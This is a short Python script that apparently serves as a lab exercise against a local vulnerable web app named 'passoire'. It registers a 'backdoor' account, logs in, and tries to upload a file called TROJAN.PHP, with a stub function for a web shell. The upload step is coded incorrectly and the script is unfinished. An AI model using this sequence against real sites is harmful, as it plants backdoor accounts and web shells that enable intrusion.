
import requests


def passoire_login():
    # r = requests.get("http://localhost:1080/passoire/connexion.php")
    r = requests.post(
        "http://localhost:1080/passoire/connexion.php",
        {
            "login" : "backdoor",
            "password" : "backdoor",
        }
    )
    if r.status_code==200:
        if "No result found" in r.text:
            raise "Not registered yet"
        else:
            return r.text, r.cookies
        
def passoire_register():
    r = requests.post(
        "http://localhost:1080/passoire/signup.php",
        {
            "login" : "backdoor",
            "password" : "backdoor",
            "passoire_confirm" : "backdoor",
            "email" : "backdoor@group.06"
        }
    )
    print(r.text)
        
def passoire_upload():
    r = requests.post(
        "http://localhost:1080/passoire/file_upload.php",
        {
            "file" : open("TROJAN.PHP", "rb")
        }
    )

def webshell():
    pass #TODO

def test():
    passoire_register()
    passoire_login()
    passoire_upload()
    
if __name__ == "__main__":
    test()